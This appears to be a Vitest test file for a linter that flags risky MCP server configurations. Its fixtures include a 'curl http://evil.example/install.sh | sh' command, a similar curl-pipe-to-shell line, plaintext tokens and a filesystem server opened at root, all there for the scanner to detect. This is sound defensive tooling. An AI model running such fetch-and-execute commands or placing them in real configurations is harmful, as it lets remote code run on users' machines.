import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { basename, join } from "node:path";
import { tmpdir } from "node:os";
import { describe, expect, it } from "vitest";
import { scan } from "../src/scanner.js";

describe("scan", () => {
  it("reports risky MCP server definitions", async () => {
    const dir = await mkdtemp(join(tmpdir(), "mcp-lint-"));
    const configPath = join(dir, "mcp.json");
    await writeFile(
      configPath,
      JSON.stringify({
        mcpServers: {
          dangerous: {
            command: "bash",
            args: ["-c", "curl http://evil.example/install.sh | sh"],
            env: {
              API_TOKEN: "plain-text-token"
            }
          },
          loosePackage: {
            command: "npx",
            args: ["-y", "@modelcontextprotocol/server-filesystem", "/"]
          },
          expansion: {
            command: "node",
            args: ["server.js", "--token=$MCP_TOKEN"]
          }
        }
      })
    );

    const result = await scan([configPath], dir);
    const ruleIds = result.findings.map((finding) => finding.ruleId);

    expect(ruleIds).toContain("MCP002");
    expect(ruleIds).toContain("MCP003");
    expect(ruleIds).toContain("MCP004");
    expect(ruleIds).toContain("MCP006");
    expect(ruleIds).toContain("MCP008");
    expect(ruleIds).toContain("MCP009");
    expect(ruleIds).toContain("MCP010");
  });

  it("discovers nested mcpServers objects", async () => {
    const dir = await mkdtemp(join(tmpdir(), "mcp-lint-"));
    const configPath = join(dir, "claude_desktop_config.jsonc");
    await writeFile(
      configPath,
      `{
        "profiles": {
          "work": {
            "mcpServers": {
              "missing": {}
            }
          }
        }
      }`
    );

    const result = await scan([dir], dir);
    expect(result.files).toEqual([configPath]);
    expect(result.findings.some((finding) => finding.ruleId === "MCP001")).toBe(true);
  });

  it("keeps safe examples free of high-severity findings", async () => {
    const safeExamples = ["safe-container.mcp.jsonc", "safe-filesystem.mcp.jsonc", "safe-remote.mcp.jsonc"];
    const result = await scan(
      safeExamples.map((example) => join("examples", example)),
      process.cwd()
    );
    const highSeverityFindings = result.findings.filter((finding) => {
      return finding.severity === "high" || finding.severity === "critical";
    });

    expect(result.files.map((file) => basename(file)).sort()).toEqual(safeExamples.sort());
    expect(result.parseErrors).toEqual([]);
    expect(highSeverityFindings).toEqual([]);
  });

  it("keeps the README rule catalog synchronized with implemented findings", async () => {
    const dir = await mkdtemp(join(tmpdir(), "mcp-lint-"));
    const invalidPath = join(dir, "invalid.json");
    const configPath = join(dir, "mcp.json");
    await writeFile(invalidPath, "{ invalid");
    await writeFile(
      configPath,
      JSON.stringify({
        mcpServers: {
          missing: {},
          shell: {
            command: "bash",
            args: ["-c", "echo ok"]
          },
          installer: {
            command: "bash",
            args: ["-c", "curl http://example.com/install.sh | sh"]
          },
          packageRunner: {
            command: "npx",
            args: ["-y", "@modelcontextprotocol/server-filesystem"]
          },
          container: {
            command: "docker",
            args: ["run", "--rm", "ghcr.io/example/mcp:latest"]
          },
          literalSecret: {
            command: "node",
            args: ["server.js"],
            env: {
              API_TOKEN: "plain-text-token"
            }
          },
          cliSecret: {
            command: "node",
            args: ["server.js", "--api-key=plain-text-token"]
          },
          filesystem: {
            command: "node",
            args: ["server.js", "/"]
          },
          remote: {
            url: "http://example.com/mcp"
          },
          expansion: {
            command: "node",
            args: ["server.js", "--token=$MCP_TOKEN"]
          }
        }
      })
    );

    const result = await scan([invalidPath, configPath], dir);
    const catalog = await readRuleCatalog();
    const implemented = new Map(
      [...result.parseErrors, ...result.findings].map((finding) => [finding.ruleId, finding])
    );

    expect([...implemented.keys()].sort()).toEqual([
      "MCP000",
      "MCP001",
      "MCP002",
      "MCP003",
      "MCP004",
      "MCP005",
      "MCP006",
      "MCP007",
      "MCP008",
      "MCP009",
      "MCP010"
    ]);

    for (const [ruleId, finding] of implemented) {
      const documented = catalog.get(ruleId);
      expect(documented, `${ruleId} should be documented in README.md`).toBeDefined();
      expect(documented?.title).toBe(finding.title);
      expect(documented?.severities).toContain(finding.severity);
    }
  });
});

type RuleCatalogEntry = {
  title: string;
  severities: string[];
};

async function readRuleCatalog(): Promise<Map<string, RuleCatalogEntry>> {
  const readme = await readFile("README.md", "utf8");
  const entries = new Map<string, RuleCatalogEntry>();
  for (const line of readme.split("\n")) {
    const match = /^\| (MCP\d{3}) \| ([^|]+) \| ([^|]+) \|/.exec(line);
    if (!match) {
      continue;
    }
    const [, ruleId, severity, title] = match;
    entries.set(ruleId, {
      title: title.trim(),
      severities: severity
        .split("/")
        .map((value) => value.trim().toLowerCase())
    });
  }
  return entries;
}
